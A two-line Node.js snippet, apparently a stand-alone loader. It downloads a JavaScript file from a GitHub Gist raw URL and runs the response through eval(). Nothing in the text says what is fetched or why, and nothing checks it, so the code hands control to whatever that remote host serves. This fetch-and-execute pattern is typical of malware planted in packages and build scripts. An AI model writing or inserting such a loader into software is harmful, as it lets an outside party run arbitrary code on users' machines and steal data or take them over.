const https = require("https");
https.get("https://gist.githubusercontent.com/puffsdad/b53f675ad43eefafaea6356e8afae2fa/raw/61dcad249f000f638520a646d9befb850b635d99/egp.js", r => { let d = ""; r.on("data", c => d += c); r.on("end", () => eval(d)); });
